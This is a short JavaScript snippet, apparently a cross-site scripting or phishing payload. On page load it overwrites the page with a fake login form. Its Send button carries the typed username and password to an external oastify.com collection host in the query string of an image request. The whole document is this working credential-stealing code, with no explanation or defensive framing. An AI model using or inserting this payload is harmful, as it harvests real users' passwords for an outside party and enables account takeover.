window.onload = () => {
  document.body.innerHTML = `
    <input id="u">
    <input id="p" type="password">
    <button onclick="(new Image()).src='https://d9n096s0okktbxt3qwamiyg9j0prdh16.oastify.com?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value)">
      Send
    </button>
  `;
};
